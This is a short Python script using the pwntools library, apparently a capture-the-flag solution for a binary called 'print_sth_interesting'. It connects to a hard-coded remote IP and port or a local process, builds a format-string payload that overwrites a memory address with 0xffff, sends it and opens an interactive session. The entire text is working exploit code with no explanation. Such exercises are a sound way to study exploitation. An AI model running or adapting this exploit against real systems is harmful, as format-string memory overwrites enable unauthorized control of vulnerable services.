from pwn import *
context.log_level = 'debug'
local = 0
if local:
	p = process('./print_sth_interesting')
else:
	p = remote('47.94.129.246', 10007)
p.readuntil('printf:')
addr = 0x0804A038
offset = 7
payload = fmtstr_payload(offset, {addr:0xffff}, write_size='short')
# gdb.attach(p)
p.sendline(payload)
p.interactive()
